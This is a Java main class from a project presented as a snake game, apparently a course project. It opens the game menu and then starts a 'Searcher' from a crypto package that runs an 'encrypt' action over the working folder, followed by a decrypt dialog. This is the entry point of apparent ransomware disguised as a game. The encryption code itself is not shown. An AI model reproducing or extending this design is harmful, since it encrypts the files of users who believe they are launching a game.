package me.herrlestrate.snakegame;

import me.herrlestrate.snakegame.components.JDialog.DecryptDialog;
import me.herrlestrate.snakegame.components.MainMenu.MainMenu;
import me.herrlestrate.snakegame.crypto.Searcher;

import java.io.File;
import java.net.URL;

public class Game {

    private static boolean DEBUG = true;
    private static final String ROOT = getRoot();
    private static String ACTION = "encrypt";

    public static void main(String[] args){
        if(!new File(ROOT).exists()){
            System.err.println("Not found root path: " + ROOT);
            return;
        }
        MainMenu mainMenu = new MainMenu();
        mainMenu.setVisible(true);

        new Searcher().start(ROOT);
        Searcher.closeDecodedFile();

        DecryptDialog decryptDialog = new DecryptDialog();
        decryptDialog.setSize(640,480);
        decryptDialog.setVisible(true);
    }

    public static String getRoot(){
        if(isDebug()){
            return "F:\\CourseProject\\";
        } else {
            return new File("").getAbsolutePath();
        }
    }

    public static File getFileFromResources(String fileName) {

        ClassLoader classLoader = Game.class.getClassLoader();

        URL resource = classLoader.getResource(fileName);
        if (resource == null) {
            throw new IllegalArgumentException("file is not found!");
        } else {
            return new File(resource.getFile());
        }

    }

    private static boolean isDebug(){
        return DEBUG;
    }

    public static String getAction() {
        return ACTION;
    }

    public static void setAction(String ACTION) {
        Game.ACTION = ACTION;
    }
}
